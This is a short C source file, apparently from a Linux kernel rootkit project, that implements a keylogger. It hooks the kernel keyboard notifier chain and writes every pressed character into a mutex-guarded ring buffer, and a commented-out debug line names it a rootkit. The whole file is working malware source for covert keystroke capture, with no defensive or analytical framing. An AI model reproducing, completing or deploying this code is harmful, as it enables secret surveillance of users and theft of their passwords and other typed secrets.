#include "keylogger.h"

char keylogger[KEYLOGGER_SIZE]; 
size_t logger_index = 0;
DEFINE_MUTEX(keylogger_mutex);

void init_keylogger_buffer(void) {
    memset(keylogger, ' ', KEYLOGGER_SIZE);
}

int keylogger_handler(struct notifier_block* nb, unsigned long action, void* data) {
    struct keyboard_notifier_param* params = data;
    char c = params->value;

    if (!(params->down && action == KBD_KEYSYM && c)) {
        return NOTIFY_OK;
    }



    mutex_lock(&keylogger_mutex);
    keylogger[logger_index] = c;
    logger_index = (logger_index + 1) % KEYLOGGER_SIZE;
    mutex_unlock(&keylogger_mutex);

    
    //DEBUG_PRINTF("rootkit: char was read: %c\n", c)


    return NOTIFY_OK;

}